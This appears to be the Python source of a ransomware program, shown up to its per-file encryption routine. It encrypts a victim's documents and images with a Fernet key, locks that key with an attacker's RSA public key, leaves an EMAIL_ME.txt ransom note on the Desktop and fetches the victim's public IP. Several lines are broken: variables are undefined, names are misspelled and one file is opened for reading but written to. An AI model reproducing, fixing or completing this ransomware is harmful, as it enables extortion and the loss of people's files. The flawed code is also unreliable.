#!/usr/bin/python3
from cryptography.fernet import Fernet # Encrypt/Decrypt files on target
import os # Get System root
import webbrowser # Load User's Browser
import ctypes # Call DLLs or Shared libaraies
import requests # Fetch Images From Websites
import subprocess # to open up notepad 
import threading # For Multi threading
import platform # Checking Platform
from time import sleep
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES,PKCS1_OAEP # PKCS#1 OAEP is an asymmetric cipher based on RSA and the OAEP padding

def getOS():
	victim_os=platform.system()
	if victim_os=='Windows':
		return 0
	elif victim_os=='Linux':
		return 1
	else :
		return -1

class Ransomware:

	file_exts=['txt','jpg','pdf','png'] # Types of files to encrypt

	def __init__(self):

		#Initialize Variables
		self.os_int=getOS()
		self.key=None
		self.crypter=None
		self.public_key=None
		self.sysRoot = os.path.expanduser('~')  #H ome Directory Of Current User
		self.localRoot = os.path.dirname(os.path.abspath(__file__)) # Path Of Directory Where Program is Placed
		self.PublicIP = requests.get('https://api.ipify.org').text # Check For Gov/Military IPs

	def generate_key(self):

		#Generate Fernet Key and Create Fernet Object
		self.key = Fernet.generate_key() # Generate Symmetric Fernet Key To Encrypt/Decrypt Files
		self.crypter = Fernet(key) # Create Fernet Object

	def write_key(self):

		# Write Key To A Local Text File
		with open('fernet_key.txt','wb') as f:
			f.write(self.key) 
	
	def encrypt_fernet_key(self):

		# Encrypt Fernet Key With Public Key Of Attacker
		with open('fernet_key.txt','rb') as fk:
			fernet_key=fk.read() # Store Contents Of The File As A Backup

		with open(fernet_key.txt) as f:
			self.public_key=RSA.importKey(open('public.pem').read()) # Import RSA Public Key Of Attacker
			public_encryptor=PKCS1_OAEP.new(public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
			enc_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
			f.write(enc_fernet_key) # Write Out The Contents Of The Text File With Encrypted Text

		with open(f"{self.sysRoot}/Desktop/EMAIL_ME.txt",'wb') as fa :
			fa.write(enc_fernet_key)

		# Remove Any Data As Good Measure
		self.key=enc_fernet_key
		self.crypter=None 

	def encrpyt_file(self,file_path,encrypted=False):
		
		#Encrypt/Decrypt Files
		with open(file_path,'rb') as f : 
			data=f.read() # read Data from file

			# Encrypt Data
			if not encrypted :
				_data=self.cryptor.encrypt(data)
				#print(f"{file_path} Has Been Encrypted ")

			# Decrypt Data
			else :
				_data=self.cryptor.decrypt(data)
				#print(f"{file_path} Has Been Decrypted ")

		with open(file_path,'wb') as fp :
			fp.write(_data)









